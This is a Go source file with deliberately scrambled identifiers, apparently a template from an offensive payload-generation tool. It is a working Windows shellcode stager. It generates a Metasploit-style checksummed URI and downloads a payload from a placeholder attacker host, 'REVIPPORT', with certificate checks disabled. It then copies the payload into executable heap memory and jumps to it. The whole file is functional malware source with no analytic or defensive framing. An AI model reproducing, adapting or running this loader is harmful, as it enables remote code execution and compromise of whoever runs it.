package main

import (
	"crypto/tls"
	"io/ioutil"
	"math/rand"
	"net/http"
	"syscall"
	"time"
	"unsafe"
)

var (
	BJyQRxx        = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
	pYMFdBjbSa     = syscall.NewLazyDLL("kernel32.dll")
	ZfYBeZAwhLGVCi = pYMFdBjbSa.NewProc("HeapCreate")
	NFgqWNprwn     = pYMFdBjbSa.NewProc("HeapAlloc")
)

func vbNnkRqIKJjoiiy(zgSdYoPyPngVpa uintptr) (uintptr, error) {
	zybVOWnivd, _, _ := ZfYBeZAwhLGVCi.Call(0x00040000, zgSdYoPyPngVpa, 0)
	GSJguXKF, _, _ := NFgqWNprwn.Call(zybVOWnivd, 0x00000008, zgSdYoPyPngVpa)
	if GSJguXKF == 0 {
		return 0, nil
	}
	return GSJguXKF, nil
}
func zfRbWRTglU(tGrloqk int, zNuggNPZo []byte) string {
	DOWIcn := rand.New(rand.NewSource(time.Now().UnixNano()))
	var XNFepYCrN []byte
	for YDlDmTwPwQLS := 0; YDlDmTwPwQLS < tGrloqk; YDlDmTwPwQLS++ {
		XNFepYCrN = append(XNFepYCrN, zNuggNPZo[DOWIcn.Intn(len(zNuggNPZo))])
	}
	return string(XNFepYCrN)
}
func wnJAnr(tGrloqk int) string {
	zNuggNPZo := []byte(BJyQRxx)
	return zfRbWRTglU(tGrloqk, zNuggNPZo)
}
func GCVQeHOtb(hDPrqfO, tGrloqk int) string {
	for {
		rTumlWsp := 0
		FevxLalJuLN := wnJAnr(tGrloqk)
		for _, dJrBBcfQ := range []byte(FevxLalJuLN) {
			rTumlWsp += int(dJrBBcfQ)
		}
		if rTumlWsp%0x100 == hDPrqfO {
			return "/" + FevxLalJuLN
		}
	}
}
func main() {
	PryCgiiZsjNE := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	ttSZNuLlsgrWRdf := http.Client{Transport: PryCgiiZsjNE}
	lpklyrWfYIx := "https://REVIPPORT"
	gKLxfLnLqzde, _ := ttSZNuLlsgrWRdf.Get(lpklyrWfYIx + GCVQeHOtb(92, 30))
	defer gKLxfLnLqzde.Body.Close()
	JdxPBJgfHDGq, _ := ioutil.ReadAll(gKLxfLnLqzde.Body)
	GSJguXKF, _ := vbNnkRqIKJjoiiy(uintptr(len(JdxPBJgfHDGq)))
	fsoUfeev := (*[990000]byte)(unsafe.Pointer(GSJguXKF))
	for LSjWSoUKjPpYjS, dJrBBcfQ := range JdxPBJgfHDGq {
		fsoUfeev[LSjWSoUKjPpYjS] = dJrBBcfQ
	}
	syscall.Syscall(GSJguXKF, 0, 0, 0, 0)
}
